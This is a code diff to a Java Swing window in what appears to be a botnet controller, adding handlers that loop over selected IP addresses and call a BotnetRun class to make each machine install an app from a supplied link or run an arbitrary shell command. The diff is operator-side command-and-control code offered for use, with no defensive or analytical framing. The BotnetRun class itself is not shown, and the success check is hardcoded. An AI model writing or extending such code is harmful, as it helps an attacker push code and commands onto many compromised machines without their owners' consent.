@@ -7,6 +7,7 @@ package view;
 
 import java.util.ArrayList;
 import javax.swing.JOptionPane;
+import server.BotnetRun;
 
 /**
  *
@@ -17,12 +18,12 @@ public class ActionFrm extends javax.swing.JFrame {
     /**
      * Creates new form ActionFrm
      */
-    private ArrayList selectedIP; 
+    private ArrayList <String> selectedIP; 
     public ActionFrm() {
         initComponents();
     }
     
-    public ActionFrm(ArrayList selectedIP){
+    public ActionFrm(ArrayList <String> selectedIP){
         initComponents();
         this.selectedIP = selectedIP;
         String label = "Selected IP: ";
@@ -96,35 +97,47 @@ public class ActionFrm extends javax.swing.JFrame {
     private void installApplButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_installApplButtonActionPerformed
         // TODO add your handling code here:
         String linkApp = JOptionPane.showInputDialog("Your direct link app");
-        if(linkApp.isBlank())
-        {
-            JOptionPane.showMessageDialog(rootPane, "Canceled");
-        } else
-        {
-            Boolean result = true;
-            if(result)
+        if (linkApp != null){
+            if(linkApp.isEmpty())
             {
-                JOptionPane.showMessageDialog(rootPane, "Success");
+                JOptionPane.showMessageDialog(rootPane, "Insert direct link", "Errors", JOptionPane.ERROR_MESSAGE);
+            } else
+            {
+                for (String ip : this.selectedIP){
+                    BotnetRun botrun = new BotnetRun(ip, "install", linkApp);
+                }
+                Boolean result = true;
+                if(result)
+                {
+                    JOptionPane.showMessageDialog(rootPane, "Success");
+                }
+                else JOptionPane.showMessageDialog(rootPane, "Failed");
             }
-            else JOptionPane.showMessageDialog(rootPane, "Failed");
         }
+        
     }//GEN-LAST:event_installApplButtonActionPerformed
 
     private void runShellButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_runShellButtonActionPerformed
         // TODO add your handling code here:
         String command = JOptionPane.showInputDialog("Your command");
-        if(command.isBlank())
-        {
-            JOptionPane.showMessageDialog(rootPane, "Canceled");
-        } else
-        {
-            Boolean result = true;
-            if(result)
+        if (command != null){
+            if(command.isEmpty())
             {
-                JOptionPane.showMessageDialog(rootPane, "Success");
+                JOptionPane.showMessageDialog(rootPane, "Insert command", "Errors", JOptionPane.ERROR_MESSAGE);
+            } else
+            {
+                for (String ip : this.selectedIP){
+                    BotnetRun botrun = new BotnetRun(ip, "run", command);
+                }
+                Boolean result = true;
+                if(result)
+                {
+                    JOptionPane.showMessageDialog(rootPane, "Success");
+                }
+                else JOptionPane.showMessageDialog(rootPane, "Failed");
             }
-            else JOptionPane.showMessageDialog(rootPane, "Failed");
         }
+        
     }//GEN-LAST:event_runShellButtonActionPerformed
 
     /**
